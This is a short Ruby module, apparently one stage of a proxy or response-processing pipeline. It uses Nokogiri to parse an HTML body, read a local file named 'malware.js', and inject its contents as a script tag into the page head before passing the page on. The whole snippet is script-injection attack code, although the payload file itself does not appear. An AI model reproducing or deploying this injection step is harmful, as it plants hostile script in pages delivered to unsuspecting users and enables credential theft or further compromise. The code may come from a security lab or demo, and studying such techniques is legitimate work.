require 'nokogiri'

module Three
  def self.call(out)
    document = Nokogiri::HTML.parse(out[:body])
    data = Nokogiri::HTML.parse("<script type='text/javascript'> #{File.read('malware.js')}")
    document.at('head').add_child(data.css('head').children.first)
    { type: out[:type],
      body: document.to_html,
      for_three: out[:for_three] }
  end
end